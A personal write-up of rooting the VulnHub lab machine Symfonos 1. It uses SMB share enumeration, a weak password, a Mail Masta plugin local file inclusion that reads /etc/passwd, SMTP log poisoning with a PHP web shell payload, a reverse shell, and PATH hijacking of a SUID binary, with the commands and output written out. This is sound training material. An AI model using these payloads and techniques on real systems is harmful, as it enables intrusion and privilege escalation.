# Symfonos 1 Writeup

Let's start with a network scan 
```bash
Currently scanning: 192.168.0.105/24   |   Screen View: Unique Hosts                                                                                                                                         
                                                                                                                                                                                                              
 3 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 180                                                                                                                                              
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      2     120  Unknown vendor                                                                                                                                             
 192.168.0.115   00:0c:29:84:f2:bb      1      60  VMware, Inc.
```
\
Next , Open Ports
```bash
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 64
25/tcp  open  smtp         syn-ack ttl 64
80/tcp  open  http         syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
```
\
So i found nothing useful on port 80 , ran dirb , dirsearch still nothing interesting , So i move on to smb
```bash
mbmap -H 192.168.0.115                    

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 192.168.0.115:445       Name: 192.168.0.115             Status: NULL Session
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        helios                                                  NO ACCESS       Helios personal share
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (Samba 4.5.16-Debian)
[*] Closed 1 connections                                                                                                     

```
\
We can see that we have a anonymous share we can access , so lets check what it has
```bash
smbclient //192.168.0.115/anonymous -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 21:14:49 2019
  ..                                  D        0  Fri Jun 28 21:12:15 2019
  attention.txt                       N      154  Fri Jun 28 21:14:49 2019

                19994224 blocks of size 1024. 17301348 blocks available
smb: \> lcd cysec/vulnhub/symfonos/
smb: \> lcd 1
smb: \> get attention.txt 
getting file \attention.txt of size 154 as attention.txt (75.2 KiloBytes/sec) (average 75.2 KiloBytes/sec)
smb: \> exit
```
```bash
cat attention.txt 

Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```
\
So we can see that the author is hinting that another user has weak passwords , Now from the smbmap result , we can see that a description "Helios personal share" hints us that there is a user helios in smb 
\
So lets try to access helios share as helios in smb
\
So i tried the passwords given in the previous note and "qwerty" worked
```bash
smbclient //192.168.0.115/helios -U helios
Password for [WORKGROUP\helios]:
session setup failed: NT_STATUS_LOGON_FAILURE
                                                                                                                                                                                                               
C:\home\kali> smbclient //192.168.0.115/helios -U helios
Password for [WORKGROUP\helios]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun 28 20:32:05 2019
  ..                                  D        0  Fri Jun 28 20:37:04 2019
  research.txt                        A      432  Fri Jun 28 20:32:05 2019
  todo.txt                            A       52  Fri Jun 28 20:32:05 2019

                19994224 blocks of size 1024. 17301348 blocks available
smb: \> get research.txt 
getting file \research.txt of size 432 as research.txt (140.6 KiloBytes/sec) (average 140.6 KiloBytes/sec)
smb: \> get todo.txt 
getting file \todo.txt of size 52 as todo.txt (25.4 KiloBytes/sec) (average 94.5 KiloBytes/sec)
smb: \> exit
```
\
Now , Let's read those files
```bash
cat research.txt 
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
                                                                                                                                                                                                               
C:\home\kali\cysec\vulnhub\symfonos\1> cat todo.txt    

1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```
\
So accessing the endpoint on port 80 takes us to a webpage , which is similar to a wordpress blog 
\
<img width="1131" height="778" alt="image" src="https://github.com/user-attachments/assets/a82b0984-b67f-4c5b-b566-5f858b041b10" />
\
So , lets run wpscan to check for any plugins or vulns
```bash
wpscan --url http://192.168.0.116/h3l105/ --detection-mode aggressive --enumerate ap --plugins-detection aggressive
```
\
After running the above command , we get some plugin names 
```bash
 mail-masta
 | Location: http://192.168.0.116/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 | Readme: http://192.168.0.116/h3l105/wp-content/plugins/mail-masta/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.0.116/h3l105/wp-content/plugins/mail-masta/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.0.116/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://192.168.0.116/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 | Readme: http://192.168.0.116/h3l105/wp-content/plugins/site-editor/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.0.116/h3l105/wp-content/plugins/site-editor/, status: 200
 |
 | Version: 1.1.1 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.0.116/h3l105/wp-content/plugins/site-editor/readme.txt

```
\
So i check for any known vulns with searchsploit
```bash
searchsploit mail masta
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                               |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Mail Masta 1.0 - Local File Inclusion                                                                                                                       | php/webapps/40290.txt
WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                                   | php/webapps/50226.py
WordPress Plugin Mail Masta 1.0 - SQL Injection                                                                                                                              | php/webapps/41438.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
\
Here we have a LFI vuln , and lets try to access /etc/passwd using the known poc
```bash
GET /h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
\
<img width="1320" height="537" alt="image" src="https://github.com/user-attachments/assets/503d6ee1-448d-45a5-97ad-f823fde7a4c6" />
\
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
helios:x:1000:1000:,,,:/home/helios:/bin/bash
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:109:115::/var/spool/postfix:/bin/false
```
\
Here we see that , the only users with bash shell are root and helios 
\
So using the LFI vuln , i tried accessing the private id-rsa file of helios , but no luck 
\
Then i realised the machine had port 25 open which is SMTP 
\
And we can do Log poisoning.
\
The log file can be found at 
```bash
/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios
<helios@blah.com>: Host or domain name not found. Name service error for
    name=blah.com type=MX: Host not found, try again

--2EE7C40AB0.1769249256/symfonos.localdomain
Content-Description: Delivery report
Content-Type: message/delivery-status

Reporting-MTA: dns; symfonos.localdomain
X-Postfix-Queue-ID: 2EE7C40AB0
X-Postfix-Sender: rfc822; helios@symfonos.localdomain
Arrival-Date: Fri, 28 Jun 2019 19:46:02 -0500 (CDT)

Final-Recipient: rfc822; helios@blah.com
Original-Recipient: rfc822;helios@blah.com
Action: failed
Status: 4.4.3
Diagnostic-Code: X-Postfix; Host or domain name not found. Name service error
    for name=blah.com type=MX: Host not found, try again

--2EE7C40AB0.1769249256/symfonos.localdomain
Content-Description: Undelivered Message
Content-Type: message/rfc822
Content-Transfer-Encoding: 8bit
```
\
From this we see a email 'helios@symfonos.localdomain', so lets use it in our attack
```bash
nc 192.168.0.116 25 -vvv
192.168.0.116: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.0.116] 25 (smtp) open
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
helo ok
250 symfonos.localdomain
mail from: helios@symfonos.localdomain
250 2.1.0 Ok
rcpt to: root
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
subject: <?php system($_GET["c"]);?>
blahblah
.
250 2.0.0 Ok: queued as A86E54081F
421 4.4.2 symfonos.localdomain Error: timeout exceeded
 sent 114, rcvd 236
```
\
So now when we try to read the file along with a parameter c for code exec 
```bash
GET /h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id
From helios@symfonos.localdomain  Sat Jan 24 10:51:34 2026
Return-Path: <helios@symfonos.localdomain>
X-Original-To: root
Delivered-To: root@symfonos.localdomain
Received: from ok (unknown [192.168.0.105])
	by symfonos.localdomain (Postfix) with SMTP id A86E54081F
	for <root>; Sat, 24 Jan 2026 10:50:02 -0600 (CST)
subject: uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

blahblah
```
\
So here we can see that in the subject value , we got our code exec , so lets get a reverse shell as helios
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from symfonos~192.168.0.116-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/symfonos~192.168.0.116-Linux-x86_64/2026_01_24-12_01_39-275.log 📜
helios@symfonos:/var/www/html/h3l105/wp-content/plugins/mail-masta/inc/campaign$
```
Then , after getting shell , i try to check sudo permissions , but sudo was not available
\
So i check for SUID
```bash
find / -perm -4000 -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/opt/statuscheck
/bin/mount
/bin/umount
/bin/su
/bin/ping
```
\
We see an unusual '/opt/statuscheck' binary
```bash
ls -la /opt/statuscheck
-rwsr-xr-x 1 root root 8640 Jun 28  2019 /opt/statuscheck
helios@symfonos:/home/helios$ strings /opt/statuscheck
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
```
\
WE see that the binary is using the variable 'curl' , We can probably do a PATH hijacking here
```bash
cd /tmp
echo "/bin/bash -p" > curl
chmod 777 curl
export PATH=/tmp:$PATH
/opt/statuscheck
bash-4.4# id
uid=1000(helios) gid=1000(helios) euid=0(root) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
bash-4.4# ls -la
total 24
drwx------  2 root root 4096 Jun 28  2019 .
drwxr-xr-x 22 root root 4096 Jun 28  2019 ..
lrwxrwxrwx  1 root root    9 Jun 28  2019 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Jun 28  2019 .selected_editor
-rw-r--r--  1 root root 1735 Jun 28  2019 proof.txt
bash-4.4# cat pro*

        Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

        Contact me via Twitter @zayotic to give feedback!

```
\
I actually tried to get another reverse shell of root into another port on attacker machine , but idk why it wasnt working , so i just had to upgrade my shell here
\
The End , Thank You for reading till here
